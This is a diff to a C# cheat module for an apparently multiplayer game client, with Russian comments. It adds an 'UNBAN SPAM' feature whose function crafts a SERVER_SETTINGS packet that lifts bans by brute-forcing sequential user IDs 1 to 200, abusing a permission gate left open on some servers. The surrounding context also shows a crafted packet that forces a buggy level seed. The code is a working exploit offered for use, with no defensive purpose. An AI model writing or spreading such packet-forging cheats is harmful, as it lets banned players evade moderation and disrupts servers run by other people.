@@ -297,6 +297,16 @@ namespace CSHUB.Modules
 "КОНКРЕТНЫЙ сид следующего уровня (известные баг-сиды: двойные\n" +
 "пещеры, открытые руины, аномалии). Гейт как у перков.",
                 Exec = ExecLevelSeed
+            },
+            new Method
+            {
+                Title = "🎁 UNBAN SPAM: разморозка себе",
+                Desc =
+"SERVER_SETTINGS(Properties)+BanList: c Бан-пермом (permless-сервер\n" +
+"→ есть у всех) можно СНОСИТЬ БАНЫ ПОЛЬЗОВАТЕЛЕЙ ПО ID.\n" +
+"Полезно если ты сам забанен = разморозь себя (если знаешь ID).\n" +
+"ID можно угадать перебором — счётчик UniqueIdentifier монотонный.",
+                Exec = ExecUnbanSpam
             }
         };
 
@@ -1093,6 +1103,29 @@ namespace CSHUB.Modules
             msg.WriteString("666");                        // LevelSeed = баг-сид
             GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
             return "LEVEL SEED = 666 задан (след. уровень с баг-сідом). Гейт: никто не админ.";
+        }
+
+        // ========================================================
+        //  🎁 UNBAN (BanList.ServerAdminRead, волна 605):
+        //  гейт Бан-перм — на permless-сервере он есть у всех через
+        //  AnyOneAllowed (не для HasPermission! это разные гейты).
+        //  Формат: SERVER_SETTINGS Properties + VariableUInt32 removeCount
+        //  + uint32 UniqueIdentifier × count
+        // ========================================================
+        private static string ExecUnbanSpam(int n)
+        {
+            if (!CanSend()) { return "нет подключения"; }
+            int count = Math.Min(Math.Max(n, 1), 200);
+            IWriteMessage msg = new WriteOnlyMessage();
+            msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS);
+            msg.WriteByte((byte)4);              // NetFlags.Properties
+            msg.WriteVariableUInt32(0);          // ExtraCargo count
+            msg.WriteUInt32(0);                  // net props count
+            msg.WriteBoolean(false); msg.WritePadBits();
+            msg.WriteVariableUInt32((uint)count);
+            for (uint i = 0; i < count; i++) { msg.WriteUInt32(i + 1); }
+            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
+            return "Unban-sweep ×" + count + " (нужен перм Ban; снимает баны по порядочным ID 1.." + count + ")";
         }
 
         private static string ExecSegmentTable(int n)
